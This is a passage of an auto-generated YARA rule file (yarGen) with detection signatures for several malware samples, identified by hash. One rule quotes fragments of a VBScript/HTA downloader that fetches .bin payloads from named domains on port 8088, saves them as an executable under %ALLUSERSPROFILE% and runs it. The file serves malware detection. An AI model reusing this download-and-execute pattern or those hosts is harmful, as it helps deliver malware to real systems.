      description = "mw - file f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
   strings:
      $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s2 = "D:\\PuRYxixetS3\\K1InIdoz\\ezoZ\\oN2T\\MFSDSvwj\\8bCL6P6P.pdb" fullword ascii
      $s3 = "invalid vector subscript" fullword ascii
      $s4 = "5oHw7ulOF0LwdI98LI9gpMLu14JW1ElMXWlyLo1MdoHGl4L8xmJyxwPkbk7k5KNgx0P0nqXUFGTYHGD4B67O5QtuN0rqJCz8DWbCduvaLCNMpiRafK5S1APi" fullword ascii
      $s5 = " Type Descriptor'" fullword ascii
      $s6 = "operator co_await" fullword ascii
      $s7 = "operator<=>" fullword ascii
      $s8 = ".data$rs" fullword ascii
      $s9 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
      $s10 = " Class Hierarchy Descriptor'" fullword ascii
      $s11 = " Base Class Descriptor at (" fullword ascii
      $s12 = "vector too long" fullword ascii
      $s13 = " Complete Object Locator'" fullword ascii
      $s14 = "WINDOWSPROJECT1" fullword wide
      $s15 = "WindowsProject1" fullword wide
      $s16 = "owner dead" fullword ascii /* Goodware String - occured 567 times */
      $s17 = "wrong protocol type" fullword ascii /* Goodware String - occured 567 times */
      $s18 = "connection already in progress" fullword ascii /* Goodware String - occured 567 times */
      $s19 = "network reset" fullword ascii /* Goodware String - occured 567 times */
      $s20 = "network down" fullword ascii /* Goodware String - occured 567 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_1429190cf3b36dae7e439b4314fe160e435ea42c0f3e6f45f8a0a33e1e12258f {
   meta:
      description = "mw - file 1429190cf3b36dae7e439b4314fe160e435ea42c0f3e6f45f8a0a33e1e12258f"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "1429190cf3b36dae7e439b4314fe160e435ea42c0f3e6f45f8a0a33e1e12258f"
   strings:
      $s1 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii
      $s2 = "  VirtualProtect failed with code 0x%x" fullword ascii
      $s3 = "  Unknown pseudo relocation protocol version %d." fullword ascii
      $s4 = "g0E -e" fullword ascii
      $s5 = "g0- U[" fullword ascii
      $s6 = " -P:7-}" fullword ascii
      $s7 = "windir" fullword ascii /* Goodware String - occured 47 times */
      $s8 = "tQHcJ<H" fullword ascii
      $s9 = "DceRpcSs" fullword ascii
      $s10 = "tLIcC<L" fullword ascii
      $s11 = "tKIc@<H" fullword ascii
      $s12 = "tFIcH<L" fullword ascii
      $s13 = "  Unknown pseudo relocation bit size %d." fullword ascii
      $s14 = "\\5q'm8x)f/c;{\"j5pi" fullword ascii
      $s15 = "*C)5NEzj" fullword ascii
      $s16 = "\"iPxB/J" fullword ascii
      $s17 = "p~kBP<M" fullword ascii
      $s18 = "C-<N3+" fullword ascii
      $s19 = ":7z<N4" fullword ascii
      $s20 = "V5#k5N" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_234e4df3d9304136224f2a6c37cb6b5f6d8336c4e105afce857832015e97f27a {
   meta:
      description = "mw - file 234e4df3d9304136224f2a6c37cb6b5f6d8336c4e105afce857832015e97f27a"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "234e4df3d9304136224f2a6c37cb6b5f6d8336c4e105afce857832015e97f27a"
   strings:
      $s1 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii
      $s2 = "  VirtualProtect failed with code 0x%x" fullword ascii
      $s3 = "  Unknown pseudo relocation protocol version %d." fullword ascii
      $s4 = "]n{1Qn{5QdS%R%%" fullword ascii
      $s5 = "3;a3_/3" fullword ascii /* hex encoded string ':3' */
      $s6 = "'j9&- " fullword ascii
      $s7 = "windir" fullword ascii /* Goodware String - occured 47 times */
      $s8 = "DceRpcSs" fullword ascii
      $s9 = "fRGE`ZGAd[1" fullword ascii
      $s10 = "G\\.PGB~VO" fullword ascii
      $s11 = "iVOj!j" fullword ascii
      $s12 = "srov5=%" fullword ascii
      $s13 = ".HJd!A" fullword ascii
      $s14 = "j.kwb-A" fullword ascii
      $s15 = "  Unknown pseudo relocation bit size %d." fullword ascii
      $s16 = "%s\\System32\\%s" fullword ascii /* Goodware String - occured 4 times */
      $s17 = "GCC: (GNU) 8.3-win32 20190406" fullword ascii
      $s18 = "GCC: (GNU) 7.3-win32 20180506" fullword ascii
      $s19 = "J,5-9r" fullword ascii
      $s20 = "f9IUk0G^|+UCq\"[HR" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_18c55bf653816c7ad10210a04085658e6d7919ad041061387647bdda9549917a {
   meta:
      description = "mw - file 18c55bf653816c7ad10210a04085658e6d7919ad041061387647bdda9549917a"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "18c55bf653816c7ad10210a04085658e6d7919ad041061387647bdda9549917a"
   strings:
      $s1 = "    qHide.Exec(qHide.ExpandEnvironmentStrings(\"%ALLUSERSPROFILE%\") & \"\\qIntlMacro.exe\")" fullword ascii
      $s2 = "For Each qPivotTableVersion10 in Array(\"http://paymentadvisry.com:8088/plugins/file1.bin\",\"http://jeromfastsolutions.com:8088" ascii
      $s3 = "onlinefastsolutions.com:8088/images/file1.bin\",\"http://paymentadvisry.com:8088/css/file2.bin\",\"http://jeromfastsolutions.com" ascii
      $s4 = "8/fonts/file12.bin\",\"http://insiderushings.com:8088/plugins/file4.bin\",\"http://webservicesamazin.com:8088/js/file10.bin\",\"" ascii
      $s5 = "        .savetofile qHide.ExpandEnvironmentStrings(\"%ALLUSERSPROFILE%\") & \"\\qIntlMacro.exe\", 2 " fullword ascii
      $s6 = "For Each qPivotTableVersion10 in Array(\"http://paymentadvisry.com:8088/plugins/file1.bin\",\"http://jeromfastsolutions.com:8088" ascii
      $s7 = "    qDialogWorkbookProtect.setRequestHeader \"User-Agent\", \"qIntlAddIn\"" fullword ascii
      $s8 = "nts/file13.bin\",\"http://jeromfastsolutions.com:8088/styles/file12.bin\",\"http://paymentadvisry.com:8088/fonts/file1.bin\",\"h" ascii
      $s9 = "/jeromfastsolutions.com:8088/bundle/file8.bin\")" fullword ascii
      $s10 = "    qDialogWorkbookProtect.Open \"GET\", qPivotTableVersion10, False" fullword ascii
      $s11 = "<script type=\"text/vbscript\" LANGUAGE=\"VBScript\" >" fullword ascii
      $s12 = "    Set qHide = CreateObject(\"Wscript.Shell\")" fullword ascii
      $s13 = "riving to win his own life and the return of his company. Nay, but even so he saved not his company, though he desired it sore. " ascii
      $s14 = "    Set qDialogWorkbookProtect = createobject(\"MSXML2.ServerXMLHTTP.6.0\")" fullword ascii
      $s15 = "    'Tell me, Muse, of that man, so ready at need, who wandered far and wide, after he had sacked the sacred citadel of Troy, an" ascii
      $s16 = "For through the blindness of their own hearts they perished, fools, who devoured the oxen of Helios Hyperion: but the god took f" ascii
      $s17 = "MINIMIZEBUTTON=\"no\"" fullword ascii
      $s18 = "rom them their day of returning. Of these things, goddess, daughter of Zeus, whencesoever thou hast heard thereof, declare thou " ascii
      $s19 = "        .write qDialogWorkbookProtect.responseBody" fullword ascii
      $s20 = "MAXIMIZEBUTTON=\"no\"" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 20KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f_2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76_0 {
   meta:
      description = "mw - from files 132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f, 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
      hash2 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii
      $s2 = " constructor or from DllMain." fullword ascii
      $s3 = "w(D9t$8" fullword ascii /* Goodware String - occured 2 times */
      $s4 = "This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native" ascii
      $s5 = "@8|$HtcH" fullword ascii /* Goodware String - occured 3 times */
      $s6 = ".D8l$Ht" fullword ascii /* Goodware String - occured 4 times */
      $s7 = " A]A\\_" fullword ascii
      $s8 = "f9D$HrA" fullword ascii
      $s9 = "AfxMDIFrame90s" fullword ascii /* Goodware String - occured 5 times */
      $s10 = "AfxFrameOrView90s" fullword ascii /* Goodware String - occured 5 times */
      $s11 = "T$HD;T$@C" fullword ascii /* Goodware String - occured 5 times */
      $s12 = "@8x(u<H" fullword ascii /* Goodware String - occured 5 times */
      $s13 = "D$XD+D$PD" fullword ascii /* Goodware String - occured 5 times */
      $s14 = "AfxOleControl90s" fullword ascii /* Goodware String - occured 5 times */
      $s15 = "fD9\"t!H" fullword ascii /* Goodware String - occured 5 times */
      $s16 = "AfxControlBar90s" fullword ascii /* Goodware String - occured 5 times */
      $s17 = "f99t%H" fullword ascii /* Goodware String - occured 5 times */
      $s18 = "LT$@;D$L~" fullword ascii /* Goodware String - occured 5 times */
      $s19 = "Local AppWizard-Generated Applications" fullword ascii /* Goodware String - occured 5 times */
      $s20 = "AfxWnd90s" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b_f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed0_1 {
   meta:
      description = "mw - from files 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash2 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
   strings:
      $s1 = "tQfD9 tK" fullword ascii
      $s2 = "fC9<`u" fullword ascii /* Goodware String - occured 1 times */
      $s3 = "f9t$bu" fullword ascii /* Goodware String - occured 2 times */
      $s4 = "D8|$0A" fullword ascii /* Goodware String - occured 2 times */
      $s5 = "u1!D$0H" fullword ascii /* Goodware String - occured 2 times */
      $s6 = "fD94iu" fullword ascii /* Goodware String - occured 4 times */
      $s7 = "@8t$HtsL" fullword ascii
      $s8 = " A_A^A]" fullword ascii
      $s9 = "tU;\\$0tH" fullword ascii
      $s10 = " t(<#t" fullword ascii
      $s11 = "L$@D8]" fullword ascii
      $s12 = " A_A^A\\_^" fullword ascii
      $s13 = "t'D8d$8t" fullword ascii
      $s14 = "t$`fD9+t$I" fullword ascii
      $s15 = "D8\\0>t" fullword ascii
      $s16 = "d$dD;d$ltY" fullword ascii
      $s17 = "H9L$Ht?H" fullword ascii
      $s18 = "D$h9t$P" fullword ascii
      $s19 = "f9)u:H" fullword ascii
      $s20 = "D8t$ht" fullword ascii /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b_82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7c_2 {
   meta:
      description = "mw - from files 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c, b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174, bb4fe58a0d6cbb1237d46f2952d762cc, f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash2 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash3 = "a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
      hash4 = "b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174"
      hash5 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
      hash6 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
   strings:
      $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s2 = "operator co_await" fullword ascii
      $s3 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
      $s4 = "__swift_2" fullword ascii
      $s5 = "__swift_1" fullword ascii
      $s6 = "api-ms-win-core-file-l1-2-2" fullword wide /* Goodware String - occured 1 times */
      $s7 = "api-ms-" fullword wide
      $s8 = "ext-ms-" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f_2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76_3 {
   meta:
      description = "mw - from files 132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f, 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9, 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c, b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174, bb4fe58a0d6cbb1237d46f2952d762cc, f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
      hash2 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      hash3 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash4 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash5 = "a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
      hash6 = "b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174"
      hash7 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
      hash8 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
   strings:
      $s1 = " Type Descriptor'" fullword ascii
      $s2 = " Class Hierarchy Descriptor'" fullword ascii
      $s3 = " Base Class Descriptor at (" fullword ascii
      $s4 = " Complete Object Locator'" fullword ascii
      $s5 = " delete[]" fullword ascii
      $s6 = " delete" fullword ascii
      $s7 = " new[]" fullword ascii
      $s8 = " Base Class Array'" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b_82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7c_4 {
   meta:
      description = "mw - from files 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, bb4fe58a0d6cbb1237d46f2952d762cc, f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash2 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash3 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
      hash4 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
   strings:
      $s1 = "u3HcH<H" fullword ascii /* Goodware String - occured 2 times */
      $s2 = "<StW@:" fullword ascii
      $s3 = "L$ |+L;" fullword ascii
      $s4 = "<Ct-<D" fullword ascii
      $s5 = "D<P0@:" fullword ascii
      $s6 = "<g~{<itd<ntY<ot7<pt" fullword ascii
      $s7 = "D!l$xA" fullword ascii
      $s8 = "<utT@:" fullword ascii
      $s9 = " A_A^A\\" fullword ascii
      $s10 = "<htl<jt\\<lt4<tt$<wt" fullword ascii
      $s11 = "H97u+A" fullword ascii
      $s12 = " A_A^_" fullword ascii
      $s13 = "L$&8\\$&t,8Y" fullword ascii
      $s14 = "ue!T$(H!T$ " fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1429190cf3b36dae7e439b4314fe160e435ea42c0f3e6f45f8a0a33e1e12258f_234e4df3d9304136224f2a6c37cb6b5f6d8336c4e105afce857832015e_5 {
   meta:
      description = "mw - from files 1429190cf3b36dae7e439b4314fe160e435ea42c0f3e6f45f8a0a33e1e12258f, 234e4df3d9304136224f2a6c37cb6b5f6d8336c4e105afce857832015e97f27a"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "1429190cf3b36dae7e439b4314fe160e435ea42c0f3e6f45f8a0a33e1e12258f"
      hash2 = "234e4df3d9304136224f2a6c37cb6b5f6d8336c4e105afce857832015e97f27a"
   strings:
      $s1 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii
      $s2 = "  VirtualProtect failed with code 0x%x" fullword ascii
      $s3 = "  Unknown pseudo relocation protocol version %d." fullword ascii
      $s4 = "windir" fullword ascii /* Goodware String - occured 47 times */
      $s5 = "DceRpcSs" fullword ascii
      $s6 = "  Unknown pseudo relocation bit size %d." fullword ascii
      $s7 = "%s\\System32\\%s" fullword ascii /* Goodware String - occured 4 times */
      $s8 = "GCC: (GNU) 8.3-win32 20190406" fullword ascii
      $s9 = "GCC: (GNU) 7.3-win32 20180506" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and ( all of them )
      ) or ( all of them )
}

rule _2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9_a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f70_6 {
   meta:
      description = "mw - from files 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9, a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      hash2 = "a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
   strings:
      $s1 = "http://www.digicert.com/CPS0" fullword ascii
      $s2 = "DigiCert, Inc.1 0" fullword ascii
      $s3 = "DigiCert Timestamp 20210" fullword ascii
      $s4 = "QJxy6z'" fullword ascii
      $s5 = "210101000000Z" fullword ascii
      $s6 = "16010712" ascii
      $s7 = "310106000000Z0H1" fullword ascii
      $s8 = "31010712" ascii
      $s9 = "dwc_#Ri" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b_82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7c_7 {
   meta:
      description = "mw - from files 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash2 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash3 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
   strings:
      $s1 = "D8L$0uP" fullword ascii
      $s2 = "H;xXu5" fullword ascii
      $s3 = "u4I9}(" fullword ascii
      $s4 = "k(+sPL" fullword ascii
      $s5 = "L!d$(L!d$@D" fullword ascii
      $s6 = "D$HL9gXt" fullword ascii
      $s7 = ";I9}(tiH" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530_88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c_8 {
   meta:
      description = "mw - from files 4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530, 88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
      hash2 = "88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
   strings:
      $s1 = "word/_rels/header1.xml.rels" fullword ascii
      $s2 = "word/header1.xml" fullword ascii
      $s3 = "docProps/core.xml" fullword ascii
      $s4 = "docProps/app.xml" fullword ascii
      $s5 = "word/media/image1.png" fullword ascii
      $s6 = "word/_rels/document.xml.rels" fullword ascii /* Goodware String - occured 2 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 10000KB and ( all of them )
      ) or ( all of them )
}

rule _7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b_82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7c_9 {
   meta:
      description = "mw - from files 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, bb4fe58a0d6cbb1237d46f2952d762cc"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash2 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash3 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
   strings:
      $s1 = "D$XD9x" fullword ascii /* Goodware String - occured 2 times */
      $s2 = "CA< t(<#t" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "vC8_(t" fullword ascii
      $s4 = "u\"8Z(t" fullword ascii
      $s5 = "uF8Z(t" fullword ascii
      $s6 = "vB8_(t" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95_88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c_10 {
   meta:
      description = "mw - from files 12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95, 88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95"
      hash2 = "88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
   strings:
      $s1 = "word/fontTable.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s2 = "word/settings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "word/_rels/document.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "word/document.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "word/webSettings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s6 = "word/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "word/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 10000KB and ( all of them )
      ) or ( all of them )
}

rule _12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95_4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13f_11 {
   meta:
      description = "mw - from files 12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95, 4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530, 88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95"
      hash2 = "4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
      hash3 = "88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
   strings:
      $s1 = "word/webSettings.xml" fullword ascii /* Goodware String - occured 3 times */
      $s2 = "word/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "word/settings.xml" fullword ascii /* Goodware String - occured 5 times */
      $s4 = "word/fontTable.xml" fullword ascii /* Goodware String - occured 5 times */
      $s5 = "word/styles.xml" fullword ascii /* Goodware String - occured 5 times */
      $s6 = "word/document.xml" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 10000KB and ( all of them )
      ) or ( all of them )
}

